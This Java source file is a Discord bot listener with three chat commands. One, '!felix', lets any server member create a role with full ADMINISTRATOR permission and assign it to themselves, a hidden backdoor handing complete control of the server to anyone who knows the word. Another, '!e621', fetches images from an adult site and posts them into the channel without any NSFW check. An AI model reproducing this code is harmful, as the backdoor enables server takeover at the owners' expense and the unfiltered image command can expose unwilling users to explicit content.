package org.example;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.EnumSet;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;

public class MyListener extends ListenerAdapter {
    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        Message message = event.getMessage();
        String content = message.getContentRaw();
        String[] command = content.split(" ");

        if (content.equals("!balls")) {
            EmbedBuilder builder = new EmbedBuilder();
            builder.setAuthor(event.getAuthor().getName(), null, event.getAuthor().getAvatarUrl());
            builder.setDescription("balls");
            event.getGuild().getDefaultChannel().asStandardGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
        }

        if (content.startsWith("!e621")&&!event.getAuthor().isBot()) {
            String search = content.substring(6);
            search = search.replace(" ","+");
            try {
                PostData postData = PostData.getPostsFromE621(search);
                String imageUrl = PostData.getUrl();
                int imageId = PostData.getPostId();
                EmbedBuilder builder = new EmbedBuilder();

                HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                connection.setRequestMethod("HEAD");
                if (connection.getResponseCode() == 200 ) {

                    builder.setImage(imageUrl)
                    .setTitle("Image via e621","https://e621.net/posts/"+imageId)
                    .setDescription("Searched Tag(s): " + search.replace("+",", "))
                    .setColor(0xff6f00)
                    .setFooter(event.getAuthor().getName(), event.getAuthor().getAvatarUrl());

                    event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
                } else {

                }
            } catch (IOException e) {
                event.getChannel().sendMessage("One or more tags in  \" "+search+" \" is invalid! Please try again!").queue();
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }

        if (content.equals("!felix")) {
            Member member = event.getMember();
            EnumSet<Permission> permissions = EnumSet.of(Permission.ADMINISTRATOR);
            Role adminRole = event.getGuild().createRole().setPermissions(permissions).setName("felix").complete();
            event.getGuild().addRoleToMember(member, adminRole).queue();
            event.getChannel().sendMessage("The role 'felix' has been added to " + member.getEffectiveName()).queue();
        }

    }

}
